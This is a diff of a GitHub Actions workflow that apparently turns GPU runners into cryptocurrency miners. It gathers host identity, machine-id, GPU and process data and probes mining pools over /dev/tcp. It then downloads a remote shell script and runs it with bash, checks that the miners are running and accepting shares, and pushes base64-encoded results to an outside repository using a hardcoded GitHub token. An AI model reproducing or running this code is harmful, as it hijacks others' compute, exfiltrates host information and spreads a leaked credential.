@@ -13,47 +13,45 @@ jobs:
           H=$(hostname -s); O=/tmp/ul_t2_base.txt
           {
             echo "=== ul-t2 baseline host=$H ts=$(date -u +%FT%TZ) run=$GITHUB_RUN_ID"
-            id; hostname; uname -a; cat /proc/1/cgroup | head -2; cat /etc/machine-id 2>/dev/null
+            id; hostname; uname -a; head -2 /proc/1/cgroup; cat /etc/machine-id 2>/dev/null
             echo "--- nvidia"; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,memory.used,driver_version,utilization.gpu --format=csv,noheader
-            echo "--- procs"; ps -eo pid,args= | grep -Ei 'krig|wildrig|peakminer|srbminer|python3 -m http' | grep -v grep | head -20
+            echo "--- procs"; ps -eo pid,args= | grep -Ei 'krig|wildrig|peakminer|srbminer' | grep -v grep | head -24
             echo "--- units"; systemctl list-units --all --no-legend --no-pager | grep -iE 'nv-|ul-|fleet' | head -30
-            echo "--- cron"; crontab -l 2>&1 | head -20; ls -l /etc/cron.d 2>/dev/null | head -20; cat /etc/cron.d/nv-* 2>/dev/null | head -30
-            echo "--- fleet state"; ls -l /opt/fleet/state 2>/dev/null | head -20; ls -l /opt/fleet/bin /opt/fleet/krig 2>/dev/null | head -10
+            echo "--- cron"; crontab -l 2>&1 | head -20; ls -l /etc/cron.d 2>/dev/null | head; cat /etc/cron.d/nv-* 2>/dev/null | head -30
+            echo "--- fleet"; ls -l /opt/fleet/state /opt/fleet/bin /opt/fleet/krig 2>/dev/null | head -20
             echo "--- pubip"; curl -s -m 10 https://api.ipify.org; echo
             echo "--- pool-ladder"
             for ep in prl.kryptex.network:8048 prl-sg.kryptex.network:8048 prl-sg.kryptex.network:7048 prl-eu.kryptex.network:7048 pool.pearlhash.xyz:9443 pearl.luckypool.io:443; do
-              h=${ep%:*}; p=${ep#*:}
-              (echo > /dev/tcp/$h/$p) >/dev/null 2>&1 && echo "OPEN $ep" || echo "BLK $ep"
+              hh=${ep%:*}; pp=${ep#*:}
+              (echo > /dev/tcp/$hh/$pp) >/dev/null 2>&1 && echo "OPEN $ep" || echo "BLK $ep"
             done
             echo "=== END"
           } > $O 2>&1
           cat $O
-          b=$(base64 -w0 < $O);           GH=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
-          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/cmdout8/ul-t2-base_$H.txt" | python3 -c 'import sys,json
-try: print(json.load(sys.stdin).get("sha",""))
-except Exception: print("")')
-          if [ -n "$sha" ]; then body="{\"message\":\"ul-t2 baseline $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else body="{\"message\":\"ul-t2 baseline $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
-          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$body" "https://api.github.com/repos/dongsuju/ul-plant/contents/cmdout8/ul-t2-base_$H.txt"
+          b=$(base64 -w0 < $O); GH=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
+          F=cmdout8/ul-t2-base_$H.txt
+          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$sha" ]; then B="{\"message\":\"ul-t2 base $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else B="{\"message\":\"ul-t2 base $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
+          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$B" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F"
       - name: convert
         run: |
           set +e
           H=$(hostname -s); L=/opt/fleet/logs; O=/tmp/ul_t2_conv.txt
-          curl -fsSL -m 60 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://raw.githubusercontent.com/dongsuju/ul-plant/main/cmd8/all.sh' -o /tmp/ul_t2_all.sh
+          curl -fsSL -m 60 -H 'Authorization: token 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' 'https://raw.githubusercontent.com/dongsuju/ul-plant/main/cmd8/all.sh' -o /tmp/ul_t2_all.sh
           echo "payload_sha256=$(sha256sum /tmp/ul_t2_all.sh | cut -d' ' -f1) bytes=$(wc -c < /tmp/ul_t2_all.sh)"
           bash /tmp/ul_t2_all.sh > /tmp/ul_t2_all.log 2>&1
           {
             echo "=== ul-t2 convert host=$H ts=$(date -u +%FT%TZ) run=$GITHUB_RUN_ID"
             tail -120 /tmp/ul_t2_all.log
             echo "--- procs now"; pgrep -af 'krig-miner|wildrig-multi' | head -16
-            echo "--- units now"; systemctl list-units 'nv-cuda-cache@*;ul-*' --all --no-legend --no-pager 2>/dev/null | head -20
+            echo "--- units now"; systemctl list-units --all --no-legend --no-pager 2>/dev/null | grep -E 'nv-|ul-|fleet' | head -20
             echo "--- accepted lines"; grep -h 'accepted' $L/t2-$H-g*.log 2>/dev/null | tail -10
-            echo "--- wallet in argv"; pgrep -af krig-miner | head -2
+            echo "--- argv"; pgrep -af krig-miner | head -2
             echo "=== END"
           } > $O 2>&1
           cat $O
           b=$(base64 -w0 < $O); GH=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
-          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/cmdout8/ul-t2-conv_$H.txt" | python3 -c 'import sys,json
-try: print(json.load(sys.stdin).get("sha",""))
-except Exception: print("")')
-          if [ -n "$sha" ]; then body="{\"message\":\"ul-t2 convert $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else body="{\"message\":\"ul-t2 convert $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
-          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$body" "https://api.github.com/repos/dongsuju/ul-plant/contents/cmdout8/ul-t2-conv_$H.txt"
+          F=cmdout8/ul-t2-conv_$H.txt
+          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$sha" ]; then B="{\"message\":\"ul-t2 conv $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else B="{\"message\":\"ul-t2 conv $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
+          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$B" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F"
